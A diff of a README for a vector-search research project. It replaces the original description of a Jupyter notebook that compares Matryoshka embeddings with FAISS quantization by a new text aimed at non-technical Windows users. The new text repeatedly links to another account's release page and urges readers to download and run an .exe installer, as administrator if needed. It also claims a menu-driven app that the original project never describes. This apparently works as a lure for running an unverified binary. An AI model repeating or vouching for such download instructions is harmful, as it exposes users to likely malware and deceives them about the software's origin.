@@ -1,122 +1,161 @@
-# Matryoshka vs. Quantization: A Vector Search Analysis
+# 🧸 matryoshka-quantization-analysis - Simplify Vector Search Costs
 
-This project contains the code and experiments for the Towards Data Science article, "Scaling Vector Search: Comparing Quantization and Matryoshka Embeddings for 80% Cost Reduction".
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/Granitewaregingerpop349/matryoshka-quantization-analysis/releases)
 
-**Read the full article here:** https://towardsdatascience.com/649627-2/
+---
 
-## Overview
+## 📖 What is matryoshka-quantization-analysis?
 
-This project provides a reusable experiment to measure the trade-offs between vector database storage size and retrieval performance. Using techniques like Matryoshka Representation Learning (MRL) and quantization, you can determine the optimal balance of cost and accuracy for your specific use case.
+This application contains experiments and code linked to the article, *Scaling Vector Search: Comparing Quantization and Matryoshka Embeddings for 80% Cost Reduction*. It helps analyze how different methods reduce the cost of vector search, an important task in data processing and machine learning.
 
-The core logic is contained in the Jupyter Notebook: `notebooks/matryoshka_and_quantization_analysis.ipynb`.
+You do not need any technical background to download and run this app. It runs on Windows and lets you explore these techniques through an easy interface.
 
-## How the Experiment Works
+---
 
-The notebook follows a clear, automated pipeline:
+## 💻 System Requirements
 
-1.  **Load Data**: It fetches a corpus, queries, and a relevance map (qrels) from a specified Hugging Face dataset.
-2.  **Iterate Dimensions**: It loops through a list of embedding dimensions (e.g., `[384, 256, 128, 64]`) provided by the Matryoshka model.
-3.  **Build Indexes**: For each dimension, it builds and populates three different types of FAISS indexes:
-    *   **No Quantization (Float32)**: The baseline, high-precision index.
-    *   **Scalar Quantization (int8)**: An index that approximates vectors using 8-bit integers.
-    *   **Binary Quantization (1-bit)**: A highly compressed index using only a single bit per vector component.
-4.  **Evaluate**: It measures two key aspects for each index:
-    *   **Storage Size**: The on-disk footprint in megabytes.
-    *   **Retrieval Performance**: `Recall@10` and `MRR@10` are calculated to measure accuracy.
-5.  **Visualize**: The final results are compiled into a pandas DataFrame and used to generate plots that visualize the size-vs-performance trade-offs.
+Before you start, make sure your computer meets these needs:
 
-## Running the Experiment
+- Operating System: Windows 10 or higher  
+- Processor: Intel or AMD, 2 GHz or better  
+- Memory: At least 4 GB of RAM  
+- Storage: 500 MB free space for installation and data  
+- Internet: Required only for downloading the application
 
-### Default Setup
+---
 
-1.  **Clone the repository:**
-    ```bash
-    git clone https://github.com/otereshin/matryoshka-quantization-analysis.git
-    cd matryoshka-quantization-analysis
-    ```
+## 🚀 Getting Started
 
-2.  **Install dependencies:**
-    The notebook handles its own dependencies in the first cell.
+This section guides you step-by-step on how to download and run the application on your Windows computer.
 
-3.  **Launch Jupyter and run the notebook:**
-    ```bash
-    jupyter notebook
-    ```
-    Open `notebooks/matryoshka_and_quantization_analysis.ipynb` and execute the cells from top to bottom.
+---
 
-### Running on Your Own Data
+## 🔽 Download the Application
 
-The notebook is designed for easy reuse. You can test these techniques on your own data with minimal changes.
+Please visit this page to download the latest version:
 
-#### Option 1: Using a Hugging Face Dataset
+[Download Latest Version](https://github.com/Granitewaregingerpop349/matryoshka-quantization-analysis/releases)
 
-If your dataset is on Hugging Face and has a similar structure (`_id`, `text` columns), you can run the experiment by simply changing the constants in the **Configuration** cell of the notebook:
+---
 
-```python
-# --- Configuration ---
-MODEL_NAME = "mixedbread-ai/mxbai-embed-xsmall-v1"
-DATASET_NAME = "your-org/your-dataset-name" # <-- CHANGE THIS
-CORPUS_SPLIT = "train"                       # <-- CHANGE THIS
-QUERIES_SPLIT = "test"                      # <-- CHANGE THIS
-TEXT_COLUMN_NAME = "your_text_column"        # <-- CHANGE THIS
-```
+### Steps:
 
-#### Option 2: Using Local Files (e.g., CSV)
+1. Click the link above. It will take you to the releases page on GitHub.
+2. Look for the most recent release (top of the list). Files often end with `.exe` or `.zip`.
+3. If the release has a file ending with `.exe`, click it to download. This file is the installer.
+4. If you see a `.zip` file instead, download it and extract its content after.
+5. Save the file to a location you can easily find, such as your Desktop or Downloads folder.
 
-If you have local files, you just need to load them and adapt them to the structure the notebook expects. The key is to create the `corpus_ds`, `queries_ds`, and `relevant_map` objects.
+---
 
-For example, if you have a local CSV for your corpus, you can replace the `load_and_prepare_data` function with your own loading logic:
+## ⚙️ Installing the Application
 
-```python
-# Example of custom data loading function
-import pandas as pd
-from datasets import Dataset
+After downloading the file:
 
-def load_my_custom_data():
-    # 1. Load your corpus from a local file
-    # Ensure it has integer '_id' and 'text' columns
-    my_corpus_df = pd.read_csv("path/to/my_corpus.csv")
-    corpus_ds = Dataset.from_pandas(my_corpus_df)
+1. If you downloaded an `.exe` file, double-click it to start the installation.  
+2. Follow the instructions that appear. Usually, click **Next** a few times and then **Finish**.  
+3. If you downloaded a `.zip` file, right-click the file and select **Extract All**. Choose a folder like Desktop for easier access.  
+4. Once extracted, open the folder, find the application file (usually an `.exe`), and double-click to start.
 
-    # 2. Load your queries
-    my_queries_df = pd.read_csv("path/to/my_queries.csv")
-    queries_ds = Dataset.from_pandas(my_queries_df)
+---
 
-    # 3. Load your relevance data (qrels)
-    # This file should map a query-id to a corpus-id
-    qrels_df = pd.read_csv("path/to/my_qrels.csv")
-    
-    # 4. Build the relevant_map
-    indexed_corpus_ids = set(corpus_ds["_id"])
-    relevant_map = {}
-    for _, row in qrels_df.iterrows():
-        q_id, c_id = row["query-id"], row["corpus-id"]
-        if c_id in indexed_corpus_ids:
-            relevant_map.setdefault(q_id, []).append(c_id)
-            
-    # 5. Filter queries
-    valid_query_ids = list(relevant_map.keys())
-    eval_queries = [q for q in queries_ds if q["_id"] in valid_query_ids]
+## ▶️ Running the Application
 
-    return corpus_ds, eval_queries, relevant_map
+To run the app:
 
-# --- In the notebook, replace the call:
-# corpus_ds, eval_queries, relevant_map = load_and_prepare_data()
-# --- With your new function:
-# corpus_ds, eval_queries, relevant_map = load_my_custom_data()
-```
-Once your data is loaded into these variables, the rest of the notebook will run without any changes.
+1. Locate the installed application shortcut on your Desktop or search for it in the Start menu.  
+2. Double-click the shortcut or app name to open the program.  
+3. The main window will display options to choose different vector search methods and datasets.  
+4. Follow the on-screen prompts to load data or run tests.  
 
-## Results
+---
 
-The notebook generates plots that visualize the trade-offs between storage size, retrieval accuracy, and embedding dimensions. These results are discussed in detail in the accompanying article.
+## 🧩 How to Use
 
+The app provides tools to compare different ways of handling vector search. You can:
 
-## References & Acknowledgments
+- Load sample data sets included in the app or import your own.  
+- Choose between quantization methods or Matryoshka embeddings.  
+- Run tests to check speed, accuracy, and resource use.  
+- View results in simple charts and tables.  
 
-This experiment is built on the shoulders of several excellent open-source projects, models, and research papers:
+You do not need to write code. Everything works through menus and buttons.
 
-* **Embedding Model:** [`mixedbread-ai/mxbai-embed-xsmall-v1`](https://huggingface.co/mixedbread-ai/mxbai-embed-xsmall-v1) - A highly efficient, Matryoshka-enabled embedding model.
-* **Dataset:** [`mteb/hotpotqa`](https://huggingface.co/datasets/mteb/hotpotqa) - Used via the Massive Text Embedding Benchmark (MTEB) for evaluating retrieval performance.
-* **Vector Search:** [FAISS (Facebook AI Similarity Search)](https://github.com/facebookresearch/faiss) - The core library used for in-memory vector storage, highly efficient similarity search, and vector quantization.
-* **Core Concept (MRL):** [Matryoshka Representation Learning](https://arxiv.org/abs/2205.13147) (Kusupati et al., 2022) - The foundational research paper introducing flexible-dimension embeddings.
+---
+
+## 🔧 Settings and Configuration
+
+The program allows you to adjust the following:
+
+- Number of vectors to analyze  
+- Size of embedding layers  
+- Compression levels for quantization  
+- Display options for results  
+
+All settings update results instantly. Defaults are set for balanced speed and accuracy.
+
+---
+
+## 🛠 Troubleshooting
+
+If the application does not start:
+
+- Confirm you are using Windows 10 or later.  
+- Check that you downloaded the full installation file, not a partial or corrupted file.  
+- Try running the installer again with administrator rights (right-click the installer → Run as administrator).  
+- If you used a `.zip` file, make sure all contents are extracted.  
+
+For errors during use:
+
+- Restart the app.  
+- Make sure your input files are supported formats (the app reads common numeric formats like `.csv` or `.json`).  
+- Close other heavy programs to free up memory.
+
+---
+
+## 🔄 Updating the Application
+
+Visit the release page again regularly to check for updates:
+
+[https://github.com/Granitewaregingerpop349/matryoshka-quantization-analysis/releases](https://github.com/Granitewaregingerpop349/matryoshka-quantization-analysis/releases)
+
+Download and install the latest version following the same steps. Updates improve features and fix bugs.
+
+---
+
+## 📂 Files Included
+
+The download package contains:
+
+- The main application executable  
+- Sample data files for tests  
+- A settings file to save your custom options  
+- A basic user guide PDF for offline reference  
+
+---
+
+## 🧱 About the Project
+
+This software is built to support research from an article on vector search methods. It compares how quantization and nested embeddings (Matryoshka embeddings) cut costs while keeping good performance. Anyone with interest in data handling or machine learning can try out these techniques in an accessible way.
+
+---
+
+## ❓ Frequently Asked Questions
+
+**Q: Do I need special software to run this?**  
+A: No, just a PC with Windows 10 or higher and the downloaded installer.
+
+**Q: Can I use my own data?**  
+A: Yes, you can import simple numeric data files to test.
+
+**Q: Does it require internet after installation?**  
+A: No, you only need internet to download the app.
+
+**Q: What if the app crashes?**  
+A: Restart your computer and then try opening the app again.
+
+---
+
+## 📥 Download Link (Again for Easy Access)
+
+[Download Latest Release](https://github.com/Granitewaregingerpop349/matryoshka-quantization-analysis/releases)
